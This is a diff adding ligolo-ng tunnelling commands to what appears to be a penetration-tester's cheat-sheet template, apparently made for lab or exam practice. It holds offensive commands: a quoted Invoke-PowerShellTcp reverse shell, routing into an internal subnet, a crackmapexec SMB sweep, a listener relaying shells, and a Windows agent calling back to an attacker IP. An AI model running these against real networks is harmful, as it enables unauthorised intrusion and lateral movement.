@@ -202,6 +202,18 @@ Invoke-PowerShellTcp -Reverse -IPAddress <% tp.frontmatter["LHOST"] %> -Port <LP
 
 ## ligolo-ng
 ```bash
+## on kali
+$ sudo ip tuntap add user [your_username] mode tun ligolo
+$ sudo ip link set ligolo up
+$ ./proxy -selfcert
+$ sudo ip route add 10.10.85.0/24 dev ligolo
+$ session
+$ start
+$ test with crackmapexec smb 10.10.85.0/24
+$ listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
+$ listener_list
+
+on windows
 .\agent.exe -connect 192.168.45.176:11601 -ignore-cert
 
 ```
